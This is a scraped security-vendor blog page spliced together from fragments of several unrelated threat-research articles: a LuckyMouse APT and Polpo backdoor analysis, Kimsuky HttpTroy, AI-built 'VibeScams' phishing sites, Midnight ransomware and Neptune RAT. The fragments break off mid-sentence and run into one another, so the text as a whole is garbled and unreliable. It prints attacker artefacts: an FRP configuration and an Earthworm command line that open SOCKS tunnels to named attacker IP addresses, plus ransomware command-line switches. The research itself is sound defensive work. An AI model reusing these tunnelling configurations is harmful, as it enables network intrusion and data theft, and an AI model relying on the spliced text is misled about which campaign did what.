srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-5.png.webp?itok=S99mcGBv 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-5.png.webp?itok=7qm6F20m 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-5.png.webp?itok=Vpq8Xs-w 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-5.png.webp?itok=Oyb5dSuK 2x" media="(min-width: 420px)"/><img Command data parsing" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 7: Command data parsing</div></div><div class="RichText_wrapper__xZRh7"><p>The AES encryption key is derived from the first packet of each new command received from the C&amp;C server, using the algorithm below:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-6.png.webp?itok=ysuWnwXS 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-6.png.webp?itok=bpgQVlgb 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-6.png.webp?itok=RYfdqQ9G 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-6.png.webp?itok=MJgH5ShM 2x" media="(min-width: 720px)"/><source Encryption key computation" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 8: Encryption key computation</div></div><div class="RichText_wrapper__xZRh7"><p>The sample checks for a proxy configured on the system found in the Registry Key <em>Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable. </em>If a proxy is configured it uses the server specified in <em>Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer </em>for all the connections.&nbsp;</p><h4><strong>Polpo – Functionality</strong></h4><p>There are more than 15 commands supported by the backdoor, although some of them are duplicates. Most of the commands are executed in separate threads. Errors and inter-thread communication are handled using Events.</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-7.png.webp?itok=EfleUvKw 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-7.png.webp?itok=UimwT7KX 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-7.png.webp?itok=sqH5Yclc 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-7.png.webp?itok=R1bXF2Qg 2x" media="(min-width: 720px)"/><source Command dispatcher" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 9: Command dispatcher</div></div><div class="RichText_wrapper__xZRh7"><p>These commands are supported by the version of Polpo we’ve analyzed:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/Screenshot%202024-06-24%20at%2011.19.56%E2%80%AFAM.png.webp?itok=CxcppXdt 1x, media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.19.56%E2%80%AFAM.png.webp?itok=q3FiikHL" width="100%" height="unset" alt="" class="mantine-q24tb8"/></picture></div><div class="RichText_wrapper__xZRh7"><h2><strong>UAC bypass tool</strong></h2><p>An open-source UAC bypass tool (<a href="https://github.com/vestjoe/WinPwnage#uac-bypass-techniques">https://github.com/vestjoe/WinPwnage</a>) was detected on several compromised devices. It may be used to elevate privileges or achieve persistence on the system. We presume that it was used to execute tasks and programs under administrator-level permissions.&nbsp;</p><h2><strong>Port-scanners</strong></h2><p>Several different port scanners were seen on compromised devices under various filenames. One of the used port scanners was open-source <a href="https://github.com/kingron/s">https://github.com/kingron/s</a>. We assume that in this case it was used for scanning the ports of the server to find out which services were running.</p><h2><strong>Nbtscan</strong></h2><p>Nbtscan is a command-line NetBIOS scanner for Windows that scans for open NetBIOS name servers in the network.</p><h2><strong>Passwords dumpers</strong></h2><p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> and <a href="https://github.com/AlessandroZ/LaZagne">Lazagne</a> were seen on the infected computers. We presume that they were used to retrieve credentials from the compromised computers. We’ve also spotted a wrapped Mimikatz version, download from <a href="https://github.com/jas502n/mimikat_ssp">https://github.com/jas502n/mimikat_ssp</a>, on several compromised devices.</p><h2><strong>FRP</strong></h2><p>Fast Reverse Proxy (FRP) is a tool that allows you to expose local services that are hidden behind the NAT or a firewall to the internet. Both the raw TCP and UDP are supported as well as several other protocols whose requests can be forwarded to the internal services via this proxy. We’ve recovered a configuration file <em>3bef4cd.tmp</em> for this proxy. The content of this proxy is the following:</p><p>[common]<br>server_addr = 202.59.9[.]58<br>server_port = 8443<br>privilege_token = %token%<br>[SDJY_proxy]<br>type = tcp<br>remote_port = 6001<br>plugin = socks5</p><p>It is immediately obvious that the actor used the SOCKS5 plugin to route requests to the compromised network via 202.59.9[.]58:8443.</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/FRP_graph.png.webp?itok=FlbsrLM4 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/FRP_graph.png.webp?itok=u929aPYO 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/FRP_graph.png.webp?itok=RRBnM_h8 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/FRP_graph.png.webp?itok=krp3kRkN 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/FRP_graph.png.webp?itok=pdFuuMia 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/FRP_graph.png.webp?itok=rrfPYi2N 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/FRP_graph.png.webp?itok=pdFuuMia" width="100%" height="unset" alt="Figure 10: Diagram of FRP tool usage" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 10: Diagram of FRP tool usage</div></div><div class="RichText_wrapper__xZRh7"><h2><strong>Earthworm tunneler</strong></h2><p>The Earthworm tunneler is considered to be a typical tool for Chinese-speaking actors by Kaspersky[1]. We’ve seen this tool on all compromised systems of national data center. On one of these devices, we’ve managed to recover command-line parameters that were used:&nbsp; <em>-s rssocks -d 139.180.155.133 -e 80</em>. The tool itself creates a SOCKS tunnel to the provided server. It is publically available at <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a>.</p><h2><strong>Conclusions</strong></h2><p>As this blogpost demonstrates, LuckyMouse has used new methods to infiltrate the government institution through a third party’s system which they attacked.&nbsp;</p><p>Avast has recently protected users in the government institution and national data center from further attacks using the samples we analyzed. We also discovered an interesting encryption method that delivers a hidden IP address in the whitespace of the C&amp;C response. We presume that the attackers updated their attacking toolset in this campaign after it was discovered by Avast.</p><p>I would like to thank Adolf Středa, David Zimmer and Anh Ho for helping me with this research.</p><h2><strong>Indicators of Compromise (IoC)</strong></h2><ul><li>&nbsp;Repository:&nbsp;<a href="https://github.com/avast/ioc/tree/master/LuckyMouse">https://github.com/avast/ioc/tree/master/</a></li><li> List of SHA-256:&nbsp;<a href="https://github.com/avast/ioc/blob/master/LuckyMouse/samples.sha256">https://github.com/avast/ioc/blob/master/</a></li></ul><h2><strong>MITRE ATT&amp;CK techniques</strong></h2></div><div We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.\u003c/p\u003e\u003cp\u003eAccording to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThere are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eAttribution \u0026amp; Clusterization\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e][\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (\u003cem\u003eIntgStat.exe\u003c/em\u003e). This is a legitimate application that loads a DLL \u003cem\u003epcalocalresloader.dll\u003c/em\u003e. By sideloading their own version \u003cem\u003epcalocalresloader.dll\u003c/em\u003e, they load HyperBro RAT from a compressed and encrypted file\u003cem\u003e thumbs.db\u003c/em\u003e. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application \u003cem\u003ethinprobe.exe\u003c/em\u003e that loads \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e. This DLL was then used to sideload \u003cem\u003ethumb.db\u003c/em\u003e that contained encrypted and compressed HyperBro[\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eWe’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eInfection Chain\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.\u003c/p\u003e\u003cp\u003eDate: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)\u0026nbsp;\u003cbr\u003eSubject: Re: Perform a firmware update on the server\u003c/p\u003e\u003cp\u003eXXXXXX_update.exe\u0026nbsp;\u003c/p\u003e\u003cp\u003e(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)\u003c/p\u003e\u003cp\u003eThis archive drops three already familiar files – Symantec’s \u003cem\u003ethinprobe.exe\u003c/em\u003e, malicious \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e, and \u003cem\u003ethumb.db\u003c/em\u003e. recent weeks, our Threat Labs researchers have uncovered two new toolsets that show just how adaptive the DPRK’s operations have become. Kimsuky, known for its espionage-style campaigns, deployed a new backdoor we’ve named \u003cstrong\u003eHttpTroy\u003c/strong\u003e, while Lazarus introduced an upgraded version of its \u003cstrong\u003eBLINDINGCAN\u003c/strong\u003e remote access tool.\u0026nbsp;\u003c/p\u003e\u003cp\u003eBoth attacks reveal the same underlying pattern: stealthy code and layered obfuscation. In this post, we’ll break down how these tools work, what they target and what defenders can learn from the latest moves inside the DPRK playbook.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eInside DPRK’s Latest Campaigns: How Kimsuky and Lazarus Refine Their Playbook\u0026nbsp;\u003c/h2\u003e\u003cp\u003eThe Kimsuky attack targeted a single victim in KR and started with a ZIP file that looked like a VPN invoice, then quietly installed tools that let attackers move files, take screenshots and run commands. The chain has three steps: a small dropper, a loader called MemLoad, and the final backdoor, named “HttpTroy”. We see several signs that possibly tie this activity to Kimsuky: the Korean language lure, an AhnLab-style scheduled task name and command patterns seen in past Kimsuky work.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe Lazarus attack targeted two victims in CA and was caught in the middle of the attack chain, where we observed a new version of the Comebacker malware leading to a new variant of their BLINDINGCAN remote access tool.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eWe’ll explain how these attacks work in plain terms, why North Korea-aligned groups use these tricks, and simple steps you can take to avoid similar threats.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eQuick takeaways for readers:\u003c/strong\u003e do not open any attachments you did not expect, treat .scr files as programs not documents and keep your security software on and updated.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eDiving into the Kimsuky attack: MemLoad and HttpTroy\u0026nbsp;\u003c/h2\u003e\u003ch3\u003eThe Initial dropper\u0026nbsp;\u003c/h3\u003e\u003cp\u003eWhile the exact delivery mechanism remains unknown, telemetry indicates that the samples was obtained via an internet download, packaged within a ZIP archive named “\u003cstrong\u003e250908_A_HK이노션_SecuwaySSL VPN Manager U100S 100user_견적서\u003c/strong\u003e”. Given the nature of the filename, it is highly probable that the archive was distributed through a phishing email.\u0026nbsp;\u003c/p\u003e\u003cp\u003eContained within the archive is a “.scr” file bearing the same name. Execution of this file initiates the entire infection chain.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis initial sample is a lightweight GO binary containing 3 embedded files. These files are decrypted using a simple XOR operation with the key “0x39”, then written to disk and executed. To maintain user deception, the binary displays a PDF document as a decoy, displaying a fake bill for VPN services, while simultaneously registering the next stage backdoor as a COM server using “regsvr32.exe”. See below an image of the decoy PDF and the decompiled code that decrypts to the era of VibeScams, where creating a phishing site takes just a few clicks. Using simple prompts, scammers can create nearly any type of website almost instantly, without any prior knowledge. Some web-building platforms recreate an entire site from a screenshot provided by the scammer – from a home page to a shopping cart. They typically also allow perfect language localization, letting scammers instantly clone a legitimate site’s look and feel in multiple languages.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis new wave of AI-driven web building tools has dramatically lowered the barrier to entry for cybercriminals, democratizing access to sophisticated site cloning and scam operations. No longer limited to those with knowledge of HTML, CSS, and JavaScript, these platforms allow anyone with an internet connection to replicate trusted brands, banking portals, or exchange interfaces with alarming fidelity. The ease and speed of this process not only accelerate the proliferation of fraudulent websites but also makes it increasingly difficult for users to distinguish between genuine and malicious websites.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003ch2\u003eA new kind of phishing — VibeScams\u0026nbsp;\u003c/h2\u003e\u003cp\u003eWe call them \u003cem\u003eVibeScams\u003c/em\u003e because the trick isn’t in the code alone — it’s in the feeling. These pages pass the “vibe check”: the right colors, spacing, logo placement, and tiny footer links people trust at a glance. Because AI web builders can recreate that look from a single prompt or screenshot, attackers don’t need coding skills — they only need to get the vibe right. That’s enough to trick people into handing over credentials or cash, and it’s why this wave of scams spreads so fast.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image_inline","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_medium/public/2025-10/vibescams-quote2.png.webp?itok=hmcWRgGN 1x","media":"(min-width: 720px)","type":"image/webp","width":1076,"height":807},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_small/public/2025-10/vibescams-quote2.png.webp?itok=GCsBZTPJ 1x","media":"(min-width: 420px)","type":"image/webp","width":720,"height":540}],"caption":"","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_small/public/2025-10/vibescams-quote2.png.webp?itok=GCsBZTPJ","link":""}]},{"bundle":"rich_text","content":"\u003cp\u003eAs part of our research for this article, we contacted the web builders which attackers leverage more prevalently, according to our detections. We would like to share our appreciation for those companies, including Lovable, Elementor, Flazio, Softr, Webflow, WebWave, among others, for their fast reactions, quick banning of the websites, and overall cooperation. We would like to encourage anyone who stumbles upon suspicious or malicious websites to also report them to the specific providers. It matters and makes a difference.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eVibeScams as an Evolution of Phishing\u0026nbsp;\u003c/h2\u003e\u003cp\u003eAI-powered web builders make it easy for anyone—even without coding or design skills—to create professional-looking websites quickly and cheaply. By automating templates, layouts, and even content, these tools lower barriers and speed up development, but they also give attackers the same advantages, enabling scams and phishing campaigns with minimal effort. The process of using such a web builder is so intuitive and user-friendly, it’s familiar to almost everyone. Individuals are typically presented with a simple screen containing a textbox, prompting users to immediately fill in a few lines of instructions to build their dream website. our opinion, the AI generated testing websites look fairly convincing and they took no money and almost zero effort to create. That’s because we didn’t want to kill the vibe, so we also created all the testing prompts using AI and simply copy and pasted them into the AI web builders. In most cases, we didn’t need any further prompting or tweaking.\u0026nbsp;\u003c/p\u003e\u003cp\u003eNote that what we generated here are only the designs. For phishing and scam sites to work properly, there also needs to be some functionality provided, for example credentials exfiltration. Additional functionality like this is commonly offered in paid subscriptions of the web builders, or the attacker can use once again other LLMs to implement this directly into the code because in a lot of cases they can download the design locally and continue the work from there.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis demonstration directly showed us the core of why the attackers are using this – they don’t need to understand web at all to create highly believable websites for free (we only used free versions of the web builders).\u0026nbsp;\u003c/p\u003e\u003ch2\u003ePricing models\u0026nbsp;\u003c/h2\u003e\u003cp\u003eIn general, we consider these services to be cheap since there is quite a bit of competition and the user/attacker has plenty of choices to try, even for free. The fact that the attacker requires almost no skill to create a scam or phishing website highly outweighs the costs here.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe range of paid offers is vast, spanning from $0.5 per month to $500 per month, with a variety of free tiers and/or trial periods. Some of the providers also offer lifetime deals for $249 or $599.\u0026nbsp;\u003c/p\u003e\u003cp\u003eMany of these subscriptions use a relatively common credits-based model where the customer receives credits which they can use for the AI prompts. Additional aspects, since many of the web builders also offer hosting for the generated webpages, are the website limit, subdomain name selection and the ability to change the subdomain name in the future.\u0026nbsp;\u003c/p\u003e\u003cp\u003eFinally, some of the web builders also offer APIs that can be used for streamlining the webpage creation, making the whole process more automatic.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eThe Impact\u0026nbsp;\u003c/h2\u003e\u003cp\u003eIt’s important for defenders and analysts to recognize just how accessible and varied these platforms have become. Because the barrier to entry is so low and payment models are flexible, we’re seeing a rapid growth in the number of AI-generated scam and phishing websites. This massive availability means the attackers can quickly spin up new designs and relaunch new scams almost instantly.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn total, we were investigating 40 different AI web builders, 12 of which we directly contacted due to a high volume of identified malicious websites. In total, from the beginning of 2025 to the end of August, we blocked approximately 140,000 different AI-generated websites during this time, which makes roughly 580 new malicious generated websites every day, on average.\u0026nbsp;\u003c/p\u003e\u003cp\u003eSince January 2025 alone, we protected nearly 190,000 our users, with the U.S., France, Brazil, Germany, and Japan among the most affected. This shows that misuse of AI web builders is a world-wide problem, and we can only expect the threat landscape to grow.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2025-10/Q32025%20Threat%20Report%20Images-2_0.png.webp?itok=fC3pKEgb our research, we investigated various AI web builders which are being misused by attackers for performing what we call VibeScams – a creation of scam or phishing pages without the need of any knowledge of coding or web creation.\u0026nbsp;\u003c/p\u003e\u003cp\u003eAI web builders provide support for individuals who are not technically invested in creating websites, where a simple prompt can suffice for building a new website from scratch. This results in a double-edged sword where it is very useful for both regular users as well as for attackers, which is rather typical with other various AI tools, too.\u0026nbsp;\u003c/p\u003e\u003cp\u003eMany of the malicious webpages follow the expected pattern of brand impersonation for phishing attempts and scams, which our research has seen daily for many years. The difference is that with the AI web builders, the attackers need to invest little to no effort or knowledge into creating them. As the AI web builder ecosystem evolves, it’s clear that new features and easier integrations will fuel even more sophisticated phishing campaigns in the future.\u0026nbsp;\u003c/p\u003e\u003cp\u003eHow to protect yourself:\u0026nbsp;\u003c/p\u003e\u003cul\u003e\u003cli\u003eAlways watch out for too good to be true offers or investment opportunities\u003c/li\u003e\u003cli\u003eWhen dealing with a known brand, always verify whether this is the official website\u003c/li\u003e\u003cli\u003eLook out for any deviations from the designs you are already familiar with\u003c/li\u003e\u003cli\u003eUse unique passwords and MFA everywhere, preferably along with a reputable password manager\u003c/li\u003e\u003cli\u003eUse a reputable AV solution to be proactively protected against phishing and scam attempts\u003c/li\u003e\u003cli\u003eWhen in doubt, use products like Norton 360 with AI-powered scam protection to consult the security First detected by Gen researchers, Midnight blends familiar ransomware mechanics with novel cryptographic modifications – some of which unintentionally open the door to file recovery. This blog dives into the technical anatomy of Midnight, its lineage from Babuk, and the critical indicators of infection. It shows clear signs of being inspired by the Babuk ransomware family, which first appeared in early 2021 and quickly gained a reputation for its aggressive tactics and advanced technical aspects. Babuk operated as a Ransomware-as-a-Service (RaaS), targeting large organizations across healthcare, finance, government, and other critical infrastructure. The ransomware used strong encryption (HC256 and ECDH) and intermittent file encryption to maximize damage while maintaining speed.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn mid-2021, Babuk's operators abruptly shut down and leaked their full source code, including builders for Windows, ESXI and NAS variants. This leak led to a wave of inspired ransomware families, each modifying Babuk's original design to suit their own goals.\u0026nbsp;\u003c/p\u003e\u003cp\u003eMidnight is one such evolution. While it retains much of Babuk's core structure, its authors introduced several changes - most notably in the cryptographic scheme used for file encryption. These changes, while likely intended to improve the ransomware's effectiveness, inadvertently introduced weaknesses that make file decryption possible under certain conditions.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eHow to Recognize Midnight Ransomware\u0026nbsp;\u003c/h2\u003e\u003cp\u003eMidnight ransomware typically appends the .Midnight or .endpoint extension to encrypted files. In some cases, the ransomware is configured not to modify the file names. Instead, it appends the extension string directly to the end of the file content. This behavior can be observed in hex dumps and may affect file parsing.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image_inline","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_medium/public/2025-10/encrypted-files.png.webp?itok=L_B8FXWq 1x","media":"(min-width: 720px)","type":"image/webp","width":622,"height":216},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_small/public/2025-10/encrypted-files.png.webp?itok=8fphJi0n 1x","media":"(min-width: 420px)","type":"image/webp","width":622,"height":216}],"caption":"Folder listing showing files with the .Midnight extension ","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_small/public/2025-10/encrypted-files.png.webp?itok=8fphJi0n","link":""}]},{"bundle":"image_inline","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_medium/public/2025-10/extension-in-file.png.webp?itok=UAba1Pkj 1x","media":"(min-width: 720px)","type":"image/webp","width":549,"height":118},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_small/public/2025-10/extension-in-file.png.webp?itok=qV8uAqyP 1x","media":"(min-width: 420px)","type":"image/webp","width":549,"height":118}],"caption":"Hex view of an encrypted file with .Midnight appended to the file content ","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_small/public/2025-10/extension-in-file.png.webp?itok=qV8uAqyP","link":""}]},{"bundle":"rich_text","content":"\u003cp\u003eA ransom note named How To Restore Your Files.txt is dropped in the affected directories. Some samples also drop a debug log on the infected system, depending on the configuration. Known variants have been observed creating either Report.Midnight or debug.endpoint as log files.\u0026nbsp;\u003c/p\u003e\u003cp\u003eA full list of discovered samples is available in the IoCs section at the end of this article.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eCryptographic Design and Flaws\u0026nbsp;\u003c/h3\u003e\u003cp\u003eWhile Midnight's core structure and execution flow is largely inherited from Babuk, its cryptographic implementation has been significantly reworked. These changes introduced flaws that make file decryption possible, which we leveraged to develop a working decryptor.\u0026nbsp;\u003c/p\u003e\u003cp\u003eMidnight uses ChaCha20 for encrypting file contents and RSA for encrypting the ChaCha20 key. The RSA-encrypted key, along with its SHA256 hash, is appended to the end of each encrypted file. This format is consistent across known samples.\u0026nbsp;\u003c/p\u003e\u003cp\u003eTo improve performance, Midnight employs intermittent encryption, a technique also used by Babuk. However, Midnight refines this approach by applying a more granular file size-based logic to determine which portions of file to encrypt. This allows it to process large files faster while still rendering them unusable.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe ransomware accepts several command-line arguments to control its behavior:\u0026nbsp;\u003c/p\u003e\u003cul\u003e\u003cli\u003e/e appends the extension string (e.g. .Midnight) directly to the file content instead of modifying the filename.\u003c/li\u003e\u003cli\u003e/n enables encryption of network-mounted volumes.\u003c/li\u003e\u003cli\u003e--paths=PATHS targets specific directories for encryption.\u0026nbsp;\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eEarlier samples of Midnight primarily targeted high-value files such as databases, backups, and archives. These included the following extensions:\u0026nbsp;\u003c/p\u003e\u003cp\u003e.mdf .ndf .bak .dbf .dmp .rman .frm \u0026nbsp;\u003cbr\u003e.ibd .myd .myi .sql .xbk .ldf .vbi \u0026nbsp;\u003cbr\u003e.vbk .ibdata .rar .md5 and .bitmap\u0026nbsp;\u003cbr\u003e\u0026nbsp;\u003c/p\u003e\u003cp\u003eMore recent variants have broadened their scope and now encrypt nearly all file types, with the exception of executables such as .exe, .dll, and .msi.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eHow to Use the Ransomware Decryptor\u0026nbsp;\u003c/h2\u003e\u003col\u003e\u003cli\u003eDownload the decryptor \u003ca href=\"https://files.avast.com/files/decryptor/norton/norton_decryptor_midnight64.exe\" target=\"_blank\" rel=\"noreferrer noopener\"\u003ehere\u003c/a\u003e. Ransomware Analysis\u003c/h2\u003e\u003cp class=\"text-align-justify\"\u003eRansomware is written in Rust programming language. For cryptographic operations, it uses orion-rs library, \u003ca href=\"https://github.com/orion-rs/orion/releases/tag/0.17.7\"\u003eversion 0.17.7\u003c/a\u003e. Files are encrypted using Chacha20 with the help of \u003ca href=\"https://github.com/openssl/openssl/blob/master/crypto/poly1305/poly1305.c\"\u003ePoly1305 MAC\u003c/a\u003e. This hash-based method ensures integrity of encryption parameters: the encryption key, n-once, block lengths, and encrypted data itself.\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eFiles are encrypted per-blocks of 128 bytes, adding 48 bytes of extra metadata to each block, which means that encrypted files are about 37% bigger than the originals.\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eWhen executed, the ransomware searches all local drives (by drive letter) and encrypts all files, except the ones with these extensions:\u003c/p\u003e\u003ctable class=\"table\"\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003cp class=\"text-align-justify\"\u003e\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003e.7z\u0026nbsp; OSINT investigations uncovered some tentative connections, including forks of the \u003cem\u003eMasonGroup/NeptuneRatV1\u003c/em\u003e repository. Although the original repository is no longer accessible, these forks contained code heavily overlapping with XWORM. Notably, the current Neptune RAT builder references the Freemasonry group, aligning with the Discord server identified in our research.\u003c/p\u003e\u003cp\u003eReverse engineering Neptune RAT V1 revealed further compelling similarities. While the shared resource structure might be dismissed as a coincidence, given that many .NET RATs use similar frameworks, the resource encryption scheme is essentially identical in both: AES encryption in insecure ECB mode combined with the same key-derivation method using a hard-coded mutex. Their persistence mechanisms are also functionally and structurally alike. Additionally, the clipper functionality employs the same regular expressions and targets the same cryptocurrencies. Although these expressions focus on legacy Bitcoin addresses rather than newer standards like Bech32, this link is somewhat weak given the widespread use of these expressions in malware.\u003c/p\u003e\u003cp\u003eThe strong similarities between XWORM and Neptune RAT V1, contrasted with their clear divergence from other open-source RATs, strongly suggest that Neptune RAT V1 is related to XWORM. However, these parallels do not extend to Neptune RAT V2, whose trial version, while functionally similar to V1, appears to be a complete code rewrite.\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003eList of
